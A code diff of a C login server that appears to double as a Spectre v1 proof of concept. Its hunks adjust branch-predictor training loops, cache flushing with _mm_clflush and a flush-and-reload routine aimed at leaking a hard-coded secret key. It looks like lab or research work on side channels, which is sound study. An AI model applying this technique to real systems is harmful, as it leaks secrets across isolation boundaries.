@@ -30,9 +30,8 @@ struct SharedMemory layout = {
     .role_binding.role_count = ROLE_COUNT, // = 5,
     .padding1 = {0},
     .padding2 = {0},
-    .secret_key = {0x23, 0x43, 0x17, 0x59, 0x25, 0x6B, 0x3D, 0x07}
+    .secret_key = {0x26, 0x43, 0x17, 0x59, 0x25, 0x6B, 0x3D, 0x07}
 };
-
 
 int main(){
 
@@ -144,7 +143,7 @@ void launch(struct Server *server)
     while(1){
         
 
-        printf("\n========== WAITING FOR CONNECTION ==========\n");
+        //printf("\n========== WAITING FOR CONNECTION ==========\n");
         //fflush(stdout);
         int new_socket = accept(server->socket, (struct sockaddr *)&server->address, (socklen_t *)&address_length);
 
@@ -154,12 +153,12 @@ void launch(struct Server *server)
 
             int noBytes = read(new_socket, buffer, BUFFER_SIZE);
             if (noBytes < 1){
-                printf("\n========== CLIENT DISCONNECTED ==========\n");
+                //printf("\n========== CLIENT DISCONNECTED ==========\n");
                 break;
             }
 
-            printf("\n========== NEW REQUEST ==========\n");
-            printf("%s\n", buffer);
+            //printf("\n========== NEW REQUEST ==========\n");
+            //printf("%s\n", buffer);
 
             char username[USERNAME_MAX];
             char password[PASSWORD_MAX];
@@ -168,8 +167,9 @@ void launch(struct Server *server)
             int status = get_POST_body(username, password, &user_id, buffer);
             if (status > 0){
                 // trains bp for Spectre_v1
-                for (int k = 0; k < 200; k++) {
-                    volatile uint8_t warm_up = layout.secret_key[0]; // warm secret so no long fetch needed
+                int training_loops = 200 + (rand() % 30); // rndomised training loop so bp can't learn
+                for (int k = 0; k < training_loops; k++) {
+                    //volatile uint8_t warm_up = layout.secret_key[0]; // warm secret so no long fetch needed
                     volatile uint8_t warm_roles = layout.role_binding.roles[0];
                     
                     // flush to train bp
@@ -357,8 +357,9 @@ void spectre_flush_reload() {
             _mm_mfence();
 
             // TRAINING BP
-            for (int k = 0; k < 200; k++) {
-                volatile uint8_t warm_up = layout.secret_key[0]; // warm secret so no long fetch needed
+            int training_loops = 200 + (rand() % 30); // rndomised training loop so bp can't learn
+            for (int k = 0; k < training_loops; k++) {
+                //volatile uint8_t warm_up = layout.secret_key[0]; // warm secret so no long fetch needed
                 volatile uint8_t warm_roles = layout.role_binding.roles[0];
                 _mm_clflush(&layout.role_binding.role_count);
                 _mm_mfence();
